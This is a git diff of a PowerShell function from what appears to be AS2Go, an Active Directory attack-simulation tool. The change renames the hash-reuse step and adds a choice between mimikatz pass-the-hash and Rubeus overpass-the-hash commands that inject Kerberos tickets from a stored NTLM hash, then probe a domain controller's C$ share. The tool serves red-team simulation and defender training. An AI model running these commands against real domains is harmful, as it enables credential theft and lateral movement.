@@ -9,7 +9,7 @@ stored NTLM hash, and reports the outcome of the selected injection.
 Offers to repeat the selection after a command is started. Skip returns from the workflow.
 
 .EXAMPLE
-Invoke-LoadHash
+Invoke-StoredCredentialAttack
 Runs this workflow using the initialized AS2Go module configuration.
 
 .INPUTS
@@ -30,22 +30,22 @@ Loads the stored KRBTGT or NTLM hash data and reruns the matching Golden Ticket 
 Shows the injection outcome so users can see how previously saved credential material is reused.
 Request a Kerberos TGT using an NT hash (Overpass-the-Hash)
 #>
-function Invoke-LoadHash {
+function Invoke-StoredCredentialAttack {
 
     ################################################################################
-    #####                                                                      ##### 
-    #####         Load and reuse stored hash data                              #####                                 
+    #####                                                                      #####
+    #####         Load and reuse stored hash data                              #####
     #####                                                                     #####
     ################################################################################
 
     $Info = Measure-FunctionRuntime -Begin
 
     Show-CurrentPhase -Phase "ASP07_LoadHash.html"
-    Update-WindowTitle -NewTitle "Load Hash Attack"
-    Set-ASConfig -Setting "LastStage" -Value "Load Hash Attack"
+    Update-WindowTitle -NewTitle "Stored Credential Attack"
+    Set-ASConfig -Setting "LastStage" -Value "Stored Credential Attack"
 
     $gtData = Get-ASConfig -Setting "ASP07KR" -DPAPI
-    $ntData = Get-ASConfig -Setting "ASP07NT"
+    $ntData = Get-ASConfig -Setting "ASP07NT" -DPAPI
 
     $gtParts = If ($gtData) { $gtData.split("|") } else { @() }
     $ntParts = If ($ntData) { $ntData.split("|") } else { @() }
@@ -73,7 +73,7 @@ function Invoke-LoadHash {
 
         If (-not $SkipClearHost) { Clear-Host }
 
-        Write-AS2GoOutput -Type Header -Message "Reuse a previously stored hash"
+        Write-AS2GoOutput -Type Header -Message "Reuse a Previously Stored Credential"
         Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
 
         If ($gtValid) {
@@ -84,15 +84,15 @@ function Invoke-LoadHash {
         }
         write-host "`n"
 
-        $title = "Load Hash"
-        $message = "Select the stored hash data to load and use."
+        $title = "Stored Credential"
+        $message = "Select the stored credential data to reuse."
 
         If ($SafeMode) {
 
             $Options = @(
                 [pscustomobject] @{
                     Label = "&Skip"
-                    Help  = "Skip the Load Hash simulation."
+                    Help  = "Skip the Stored Credential simulation."
                     Value = $Script:No
                 }
             )
@@ -112,7 +112,7 @@ function Invoke-LoadHash {
                 },
                 [pscustomobject] @{
                     Label = "&Skip"
-                    Help  = "Skip the Load Hash simulation."
+                    Help  = "Skip the Stored Credential simulation."
                     Value = $Script:No
                 }
             )
@@ -185,16 +185,56 @@ function Invoke-LoadHash {
 
             If ($answer -eq $Script:Yes) {
 
-                Invoke-Command -ScriptBlock {
-                    & "$($Script:ASTools)\mimikatz.exe" `
-                        "privilege::debug" `
-                        "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
-                        "exit"
+                $Options = @(
+                    [pscustomobject] @{
+                        Label = "&Mimikatz"
+                        Help  = "YES to proceed"
+                        Value = "Mimikatz"
+                    },
+                    [pscustomobject] @{
+                        Label = "&Rubeus"
+                        Help  = "NO to cancel"
+                        Value = "Rubeus"
+                    },
+                    [pscustomobject] @{
+                        Label = "&Skip"
+                        Help  = "SKIP to bypass this operation"
+                        Value = $Script:Skip
+                    }
+                )
+
+                $Title = "Decision Required"
+                $message = "Please make a decision:"
+                $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
+
+                If ($answer -eq "Mimikatz") {
+                    Invoke-Command -ScriptBlock {
+                        & "$($Script:ASTools)\mimikatz.exe" `
+                            "privilege::debug" `
+                            "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
+                            "exit"
+                    }
+
+                    Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
+                    Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
+                    Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
+                    Write-AS2GoOutput -Type Command -NoExtraLines -Message "dir $($env:LogonServer)\c$"
+                }
+                elseif ($answer -eq "Rubeus") {
+
+                    Invoke-Command -ScriptBlock {
+                        & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$Global:ASHelpDeskUser /domain:$Script:ASFQDN /rc4:$Script:ASPtHntml /ptt /nowrap
+                    }
+                    Test-AccessToOneDCPerDomain
+                    $tickets = Get-KlistTicket
+                    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+                    Write-AS2GoOutput -Type Info -Message "Last Ticket"
+                    $tickets | Select-object -Last 1 | Format-List
+
+                }
+                elseif ($answer -eq $Script:Skip) {
                 }
 
-                Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
-                Write-AS2GoOutput -Type Info -Message "The Pass-the-Hash command opened a new command window for the hash reuse."
-                Write-AS2GoOutput -Type NextCommand -Message "Please continue inside the new terminal window" -NoExtraLines
             }
         }
         else {
@@ -202,7 +242,7 @@ function Invoke-LoadHash {
             return
         }
 
-        $title = "REPEAT | Load Hash"
+        $title = "REPEAT | Stored Credential"
         $repeat = Show-DecisionPrompt -Default 1 -Title $title
 
     } Until ($repeat -eq $Script:No)
